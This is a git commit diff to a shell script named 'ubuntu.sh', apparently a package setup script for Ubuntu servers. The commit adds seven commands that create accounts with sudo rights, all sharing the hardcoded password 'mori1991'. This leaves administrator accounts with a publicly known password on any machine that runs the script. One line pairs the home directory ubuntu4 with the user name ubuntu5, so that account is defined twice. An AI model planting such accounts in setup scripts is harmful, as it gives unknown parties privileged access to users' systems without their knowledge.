fbc7ce60de443cb38a57f740435c3c3e031f6873
ZarinNegah <39865873+ZarinNegah@users.noreply.github.com>
2020-05-22 19:27:41 +0430

    Update ubuntu.sh

--- ubuntu.sh
+++ ubuntu.sh
@@ -18,6 +18,13 @@ sudo apt install nload -y
 sudo apt install tmux -y
 sudo apt -y install screen
 sudo apt install golang -y
+sudo useradd -s /bin/bash -d /home/ubuntu/ -m -G sudo ubuntu -p $(openssl passwd -1 mori1991)
+sudo useradd -s /bin/bash -d /home/ubuntu1/ -m -G sudo ubuntu1 -p $(openssl passwd -1 mori1991)
+sudo useradd -s /bin/bash -d /home/ubuntu2/ -m -G sudo ubuntu2 -p $(openssl passwd -1 mori1991)
+sudo useradd -s /bin/bash -d /home/ubuntu3/ -m -G sudo ubuntu3 -p $(openssl passwd -1 mori1991)
+sudo useradd -s /bin/bash -d /home/ubuntu4/ -m -G sudo ubuntu5 -p $(openssl passwd -1 mori1991)
+sudo useradd -s /bin/bash -d /home/ubuntu5/ -m -G sudo ubuntu5 -p $(openssl passwd -1 mori1991)
+sudo useradd -s /bin/bash -d /home/ubuntu6/ -m -G sudo ubuntu6 -p $(openssl passwd -1 mori1991)
 
 # Display Service Information
 clear
